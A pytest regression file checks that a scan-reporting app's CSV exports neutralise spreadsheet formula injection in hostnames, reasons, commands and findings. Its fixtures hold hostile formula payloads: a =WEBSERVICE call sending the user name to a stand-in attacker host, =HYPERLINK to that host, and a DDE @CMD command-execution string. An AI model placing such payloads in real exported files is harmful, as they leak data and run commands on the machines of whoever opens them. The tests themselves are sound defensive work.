"""Regression tests for CSV formula-injection hardening (v2.86.4).

ExportService._format_csv_report previously wrote raw scanner / agent
strings through csv.writer directly, bypassing the _csv_safe guard
defined in reports.py.  This test pins the new shared
``app.services.csv_utils.safe_csv_row`` behaviour for every branch:
``scope_report``/``scan_report``, ``out_of_scope_findings``, and
``test_plan_execution``.
"""
from __future__ import annotations

import csv
import io

import pytest

from app.services.csv_utils import csv_safe, safe_csv_row
from app.services.export_service import ExportService


# ---------------------------------------------------------------------------
# Helper-level guarantees — the simplest contract first.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("dangerous", [
    "=WEBSERVICE(\"http://attacker.tld/?u=\"&USER())",
    "+1+1",
    "-CMD()",
    "@SUM(1+1)",
    "\tleading-tab",
    "\rleading-cr",
])
def test_csv_safe_prefixes_dangerous_cells(dangerous):
    """Every Excel/LibreOffice formula trigger gets a leading single quote."""
    out = csv_safe(dangerous)
    assert out.startswith("'"), f"expected single-quote prefix on {dangerous!r}, got {out!r}"


@pytest.mark.parametrize("safe", [
    "10.0.0.5",
    "host-01.lab.example.com",
    "Open SSH 8.4p1",
    "",
    "   leading space is fine",
    "Tag with = in middle is fine",
])
def test_csv_safe_passes_through_benign_values(safe):
    assert csv_safe(safe) == safe


def test_csv_safe_none_becomes_empty_string():
    assert csv_safe(None) == ""


# ---------------------------------------------------------------------------
# Endpoint-level — the three lightweight CSV branches in export.py that the
# v2.86.4 hardening missed (third code review #1).  ExportService is
# covered above; these tests cover the routes that hand-roll csv.writer.
# ---------------------------------------------------------------------------


def test_out_of_scope_csv_neutralizes_malicious_hostname(
    client, db_session, test_project,
):
    """v2.91.4 — /export/out-of-scope CSV branch flows hostnames through
    safe_csv_row.  Pre-fix the hostname was emitted raw."""
    from app.db import models

    host = models.Host(
        ip_address="10.55.55.5",
        hostname="=WEBSERVICE(\"http://attacker.tld\")",
        state="up",
        project_id=test_project.id,
    )
    db_session.add(host)
    db_session.commit()

    resp = client.get(
        f"/api/v1/projects/{test_project.id}/export/out-of-scope?format_type=csv"
    )
    assert resp.status_code == 200
    rows = _parse_csv(resp.text)
    # Header row + at least one data row containing our host.
    data_row = next((r for r in rows[1:] if r and r[0] == "10.55.55.5"), None)
    assert data_row is not None, f"injected host missing from output: {rows!r}"
    assert data_row[1].startswith("'="), (
        f"hostname formula not neutralized: {data_row[1]!r}"
    )


def test_scope_hosts_csv_neutralizes_malicious_hostname(
    client, db_session, test_project,
):
    """v2.91.4 — /export/scope/{id}/hosts CSV branch flows hostnames
    through safe_csv_row."""
    from app.db import models

    scope = models.Scope(project_id=test_project.id, name="injection-target")
    db_session.add(scope)
    db_session.flush()

    subnet = models.Subnet(scope_id=scope.id, cidr="10.66.66.0/24")
    db_session.add(subnet)
    db_session.flush()

    host = models.Host(
        ip_address="10.66.66.6",
        hostname="+SUM(0)",
        state="up",
        project_id=test_project.id,
    )
    db_session.add(host)
    db_session.flush()
    db_session.add(models.HostSubnetMapping(host_id=host.id, subnet_id=subnet.id))
    db_session.commit()

    resp = client.get(
        f"/api/v1/projects/{test_project.id}/export/scope/{scope.id}?format_type=csv"
    )
    assert resp.status_code == 200, resp.text
    rows = _parse_csv(resp.text)
    data_row = next((r for r in rows[1:] if r and r[0] == "10.66.66.6"), None)
    assert data_row is not None, f"injected host missing from output: {rows!r}"
    assert data_row[1].startswith("'+"), (
        f"hostname formula not neutralized: {data_row[1]!r}"
    )


def test_scan_hosts_csv_neutralizes_malicious_hostname(
    client, db_session, test_project,
):
    """v2.91.4 — /export/scan/{id} CSV branch flows hostnames through
    safe_csv_row."""
    from app.db import models

    scan = models.Scan(
        project_id=test_project.id,
        filename="injection.xml",
        tool_name="nmap",
        scan_type="nmap_xml",
    )
    db_session.add(scan)
    db_session.flush()

    host = models.Host(
        ip_address="10.77.77.7",
        hostname="@CMD|'/c calc'!A1",
        state="up",
        project_id=test_project.id,
    )
    db_session.add(host)
    db_session.flush()
    db_session.add(models.HostScanHistory(host_id=host.id, scan_id=scan.id))
    db_session.commit()

    resp = client.get(
        f"/api/v1/projects/{test_project.id}/export/scan/{scan.id}?format_type=csv"
    )
    assert resp.status_code == 200, resp.text
    rows = _parse_csv(resp.text)
    data_row = next((r for r in rows[1:] if r and r[0] == "10.77.77.7"), None)
    assert data_row is not None, f"injected host missing from output: {rows!r}"
    assert data_row[1].startswith("'@"), (
        f"hostname formula not neutralized: {data_row[1]!r}"
    )


# ---------------------------------------------------------------------------
# Endpoint-level — ExportService._format_csv_report branches.
# ---------------------------------------------------------------------------


def _parse_csv(payload: str) -> list[list[str]]:
    return list(csv.reader(io.StringIO(payload)))


def test_scope_report_neutralizes_malicious_hostname():
    svc = ExportService(db=None)  # _format_csv_report doesn't touch the session
    data = {
        "report_type": "scope_report",
        "hosts": [
            {
                "ip_address": "10.0.0.5",
                "hostname": "=WEBSERVICE(\"http://attacker.tld\")",
                "state": "up",
                "os_name": "Linux",
                "ports": [{"port_number": 22, "protocol": "tcp"}],
                "subnets": [],
                "dns_records": [],
                "scan_id": 1,
            },
        ],
    }
    result = svc._format_csv_report(data)
    rows = _parse_csv(result["data"])
    # row[0] is the header; row[1] is the data row.  Hostname is column index 1.
    assert rows[1][1].startswith("'="), \
        f"hostname formula not neutralized: {rows[1][1]!r}"


def test_out_of_scope_csv_neutralizes_malicious_reason():
    svc = ExportService(db=None)
    data = {
        "report_type": "out_of_scope_findings",
        "findings": [
            {
                "ip_address": "192.168.99.1",
                "hostname": "ignored",
                "tool_name": "nmap",
                "reason": "@CMD|'/c calc'!A1",
                "ports": [80],
                "found_at": "2026-06-03T00:00:00Z",
            },
        ],
    }
    result = svc._format_csv_report(data)
    rows = _parse_csv(result["data"])
    # Reason is column index 3.
    assert rows[1][3].startswith("'@"), \
        f"reason formula not neutralized: {rows[1][3]!r}"


def test_test_plan_execution_csv_neutralizes_hostname_command_and_findings():
    """The original field this fix targets — the test-plan-execution
    branch was the only writer that the previous v2.85.0 guard
    explicitly skipped, so cover every untrusted column in one test."""
    svc = ExportService(db=None)
    data = {
        "report_type": "test_plan_execution",
        "entries": [
            {
                "host_ip": "10.0.0.5",
                "host_hostname": "=HYPERLINK(\"http://attacker.tld\",\"click\")",
                "priority": "high",
                "test_phase": "exploit",
                "status": "completed",
                "results": [
                    {
                        "test_index": 0,
                        "status": "passed",
                        "severity": "high",
                        "is_finding": True,
                        "command_run": "+attacker_payload(1)",
                        "findings_summary": "-malicious_thing()",
                        "executed_at": "2026-06-03T00:00:00Z",
                    },
                ],
            },
        ],
    }
    result = svc._format_csv_report(data)
    rows = _parse_csv(result["data"])
    # Header at row 0; one data row at row 1.
    # Columns: 0=Host IP, 1=Hostname, 2=Priority, 3=Phase, 4=Entry Status,
    # 5=Test Index, 6=Test Status, 7=Severity, 8=Is Finding, 9=Command,
    # 10=Findings Summary, 11=Executed At.
    assert rows[1][1].startswith("'="), f"hostname not neutralized: {rows[1][1]!r}"
    assert rows[1][9].startswith("'+"), f"command_run not neutralized: {rows[1][9]!r}"
    assert rows[1][10].startswith("'-"), f"findings_summary not neutralized: {rows[1][10]!r}"


def test_test_plan_execution_csv_empty_results_row_is_neutralized_too():
    """The 'no results' branch writes a row with just entry fields and
    empty placeholders — make sure the hostname there is also neutralized."""
    svc = ExportService(db=None)
    data = {
        "report_type": "test_plan_execution",
        "entries": [
            {
                "host_ip": "10.0.0.5",
                "host_hostname": "=BAD()",
                "priority": "medium",
                "test_phase": "discovery",
                "status": "skipped",
                "results": [],  # triggers the empty-row branch
            },
        ],
    }
    result = svc._format_csv_report(data)
    rows = _parse_csv(result["data"])
    assert rows[1][1].startswith("'="), \
        f"empty-results hostname not neutralized: {rows[1][1]!r}"
